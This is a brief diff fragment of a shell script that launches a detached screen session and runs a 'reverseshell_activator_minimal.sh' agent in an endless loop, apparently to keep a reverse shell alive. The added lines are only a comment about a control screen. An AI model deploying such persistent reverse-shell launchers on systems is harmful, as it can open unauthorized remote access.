@@ -31,3 +31,6 @@ screen -dmS reverseshellAgent_$cname
 
 #Start the agent in the screen in a loop
 screen -S reverseshellAgent_$cname -X stuff "while true;do echo '' | ./reverseshell_activator_minimal.sh $cname;done"`echo -ne '\015'`
+
+#Start the screen for the controlline
+
